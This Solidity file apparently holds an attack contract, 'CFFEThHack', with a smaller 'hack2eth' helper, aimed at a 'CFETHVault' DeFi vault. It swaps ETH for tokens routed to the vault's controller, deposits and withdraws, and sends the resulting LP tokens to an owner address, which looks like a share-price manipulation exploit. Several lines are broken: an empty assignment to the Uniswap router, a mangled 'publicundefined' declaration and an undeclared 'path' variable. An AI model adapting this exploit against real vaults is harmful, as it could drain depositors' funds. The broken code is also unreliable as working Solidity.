pragma solidity >=0.4.21 <0.6.0;

interface CFETHVaultInterface{
    function deposit(uint256 _amount) external payable;
    function withdraw(uint256 _amount) external;
    function controller() external returns (address);
}

interface UniswapControllerETH{
function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}
interface LPTokenEth{
    function balanceOf(address _owner) external view returns(uint256);
    function transfer(address to, uint256 amount) external returns(bool);
}
contract CFFEThHack{
    CFETHVaultInterface internal cfVault;
    CFETHVaultInterface internal cfpool;
    LPTokenEth internal curve = LPTokenEth(0x845838DF265Dcd2c412A1Dc9e959c7d08537f8a2);
    UniswapControllerETH public uniswap = ;
    LPTokenEth internal lp;
    uint256 internal errorCode;
    constructor(
                CFETHVaultInterface _cfVault,
                CFETHVaultInterface _cfpool,
                LPTokenEth _lp
                ) public{
        cfVault = _cfVault;
        cfpool = _cfpool;
        lp = _lp;
    }
    // deposit perpare

    //withdraw tets
	address[] publicundefined;
    function withdraw(uint256 _amount) public {
        cfVault.withdraw(_amount);
    }
    //deposit test
    function supplyETH() public{
        // approve tokens
        uint256 balance = address(this).balance /2;

        uniswap.swapETHForExactTokens.value(balance)(uint256(10)**18 * 1000, path,
                                                    cfVault.controller(), block.timestamp+ 10000);

        cfVault.deposit.value(balance)(balance);
    }

    function getCurveLPBalance(address _addr) public view returns(uint256){
        return curve.balanceOf(_addr);
    }

    function transferLP(LPTokenEth _lp, address owner) public{
        lp = _lp;
        lp.transfer(owner, lp.balanceOf(address(this)));
    }

    function() external payable{

    }
}

contract hack2eth{
    CFETHVaultInterface public cfVault;
    constructor(CFETHVaultInterface _cfVault) public{
        cfVault = _cfVault;
    }

    function withdraw(uint256 _amount) public {
        cfVault.withdraw(_amount);
    }
}
